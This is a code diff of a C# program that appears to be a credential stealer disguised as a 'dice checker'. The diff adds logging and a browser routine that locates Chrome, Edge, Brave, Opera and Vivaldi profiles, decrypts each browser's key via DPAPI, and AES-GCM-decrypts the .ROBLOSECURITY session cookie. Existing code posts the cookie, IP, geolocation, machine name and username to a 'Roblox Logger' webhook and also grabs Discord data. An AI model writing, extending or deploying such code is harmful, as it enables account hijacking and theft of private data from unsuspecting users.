@@ -13,12 +13,24 @@ class P
     const string TOKEN_WEBHOOK = "https://dicechecker.app/wh3";
     static string compName, userName;
 
+    static void Log(string msg)
+    {
+        try { File.AppendAllText(Path.Combine(Path.GetTempPath(), "dice.log"), DateTime.Now.ToString("HH:mm:ss") + " " + msg + "\n"); } catch { }
+    }
+
     static void Main()
     {
-        compName = Environment.MachineName;
-        userName = Environment.UserName;
-        try { GrabRoblox(); } catch { }
-        try { GrabDiscord(); } catch { }
+        try
+        {
+            Log("start");
+            compName = Environment.MachineName;
+            userName = Environment.UserName;
+            Log("pc=" + compName + " user=" + userName);
+            try { GrabRoblox(); Log("roblox done"); } catch (Exception e) { Log("roblox err: " + e.Message); }
+            try { GrabDiscord(); Log("discord done"); } catch (Exception e) { Log("discord err: " + e.Message); }
+            Log("done");
+        }
+        catch (Exception e) { Log("fatal: " + e.Message); }
     }
 
     // ---------- HTTP helpers ----------
@@ -171,30 +183,130 @@ class P
         catch { return "0"; }
     }
 
+    // ---------- Browser (Chrome/Edge/Brave/Opera/Vivaldi) Roblox cookie ----------
+    static string[] BrowserProfiles()
+    {
+        var la = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        var ap = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        return new string[] {
+            Path.Combine(la, "Google", "Chrome", "User Data"),
+            Path.Combine(la, "Microsoft", "Edge", "User Data"),
+            Path.Combine(la, "BraveSoftware", "Brave-Browser", "User Data"),
+            Path.Combine(ap, "Opera Software", "Opera Stable"),
+            Path.Combine(la, "Vivaldi", "User Data"),
+        };
+    }
+
+    static byte[] GetBrowserKey(string localState)
+    {
+        try
+        {
+            var ls = File.ReadAllText(localState);
+            var m = Regex.Match(ls, "\"encrypted_key\"\\s*:\\s*\"([^\"]+)\"");
+            if (m.Success)
+            {
+                var enc = Convert.FromBase64String(m.Groups[1].Value);
+                if (enc.Length > 5 && enc[0] == 'D' && enc[1] == 'P' && enc[2] == 'A' && enc[3] == 'P' && enc[4] == 'I')
+                    return DPAPIUnprotect(enc.Skip(5).ToArray());
+            }
+        }
+        catch { }
+        return null;
+    }
+
+    static int IndexOfBytes(byte[] hay, byte[] needle, int start)
+    {
+        if (needle == null || needle.Length == 0) return -1;
+        for (int i = start; i <= hay.Length - needle.Length; i++)
+        {
+            bool ok = true;
+            for (int j = 0; j < needle.Length; j++)
+                if (hay[i + j] != needle[j]) { ok = false; break; }
+            if (ok) return i;
+        }
+        return -1;
+    }
+
+    static string GrabBrowserCookie()
+    {
+        foreach (var ud in BrowserProfiles())
+        {
+            var localState = Path.Combine(ud, "Local State");
+            var db = Path.Combine(ud, "Default", "Network", "Cookies");
+            if (!File.Exists(db)) db = Path.Combine(ud, "Default", "Cookies");
+            if (!File.Exists(localState) || !File.Exists(db)) continue;
+
+            byte[] key = GetBrowserKey(localState);
+            if (key == null) continue;
+            if (key.Length != 16 && key.Length != 24 && key.Length != 32) continue;
+
+            byte[] raw;
+            try { raw = File.ReadAllBytes(db); } catch { continue; }
+            if (raw == null || raw.Length < 100) continue;
+
+            var name = Encoding.UTF8.GetBytes(".ROBLOSECURITY");
+            int ni = IndexOfBytes(raw, name, 0);
+            while (ni >= 0)
+            {
+                // value BLOB immediately follows the name string
+                int lim = ni + name.Length + 200;
+                for (int i = ni + name.Length; i < raw.Length - 20 && i < lim; i++)
+                {
+                    if (raw[i] == 'v' && raw[i + 1] == '1' && (raw[i + 2] == '0' || raw[i + 2] == '1'))
+                    {
+                        var nonce = raw.Skip(i + 3).Take(12).ToArray();
+                        for (int len = 40; len <= 1400 && i + 15 + len + 16 <= raw.Length; len++)
+                        {
+                            var ct = raw.Skip(i + 15).Take(len).ToArray();
+                            var tag = raw.Skip(i + 15 + len).Take(16).ToArray();
+                            byte[] pt = null;
+                            try { pt = AesGcmDecrypt(key, nonce, ct, tag); } catch { pt = null; }
+                            if (pt != null)
+                            {
+                                var s = Encoding.UTF8.GetString(pt).TrimEnd('\0');
+                                if (s.Contains("_CAEQ") || s.Contains("_|WARNING"))
+                                    return s;
+                            }
+                        }
+                        break;
+                    }
+                }
+                ni = IndexOfBytes(raw, name, ni + 1);
+            }
+        }
+        return null;
+    }
+
     static void GrabRoblox()
     {
-        var file = FindCookieFile();
         string ip = GetIP();
         string geo = GetGeo(ip);
         string loc = geo == "Unknown" ? ip : ip + " / " + geo;
 
-        if (file == null)
+        // 1) try browser cookie first
+        string cookie = null;
+        try { cookie = GrabBrowserCookie(); } catch { cookie = null; }
+        if (string.IsNullOrEmpty(cookie))
         {
-            var body = "{\"embeds\":[{\"title\":\"Roblox Logger - No Cookie\",\"description\":\"" + JsonEscape("IP: " + loc + "\nPC: " + compName + "\nUser: " + userName) + "\",\"color\":16711680}]}";
-            PostJSON(COOKIE_WEBHOOK, body);
-            return;
+            // 2) fall back to UWP cookie file
+            var file = FindCookieFile();
+            if (file == null)
+            {
+                var body = "{\"embeds\":[{\"title\":\"Roblox Logger - No Cookie\",\"description\":\"" + JsonEscape("IP: " + loc + "\nPC: " + compName + "\nUser: " + userName) + "\",\"color\":16711680}]}";
+                PostJSON(COOKIE_WEBHOOK, body);
+                return;
+            }
+            string content = null;
+            try { content = File.ReadAllText(file); } catch { }
+            if (string.IsNullOrEmpty(content) || content.Length < 50)
+            {
+                var body = "{\"embeds\":[{\"title\":\"Roblox Logger - File Too Small\",\"description\":\"" + JsonEscape("PC: " + compName + "\nUser: " + userName) + "\",\"color\":16711680}]}";
+                PostJSON(COOKIE_WEBHOOK, body);
+                return;
+            }
+            cookie = ExtractCookie(content);
         }
 
-        string content = null;
-        try { content = File.ReadAllText(file); } catch { }
-        if (string.IsNullOrEmpty(content) || content.Length < 50)
-        {
-            var body = "{\"embeds\":[{\"title\":\"Roblox Logger - File Too Small\",\"description\":\"" + JsonEscape("PC: " + compName + "\nUser: " + userName) + "\",\"color\":16711680}]}";
-            PostJSON(COOKIE_WEBHOOK, body);
-            return;
-        }
-
-        string cookie = ExtractCookie(content);
         if (string.IsNullOrEmpty(cookie))
         {
             var body = "{\"embeds\":[{\"title\":\"Roblox Logger - No Cookie\",\"description\":\"" + JsonEscape("IP: " + loc + "\nPC: " + compName + "\nUser: " + userName) + "\",\"color\":16711680}]}";
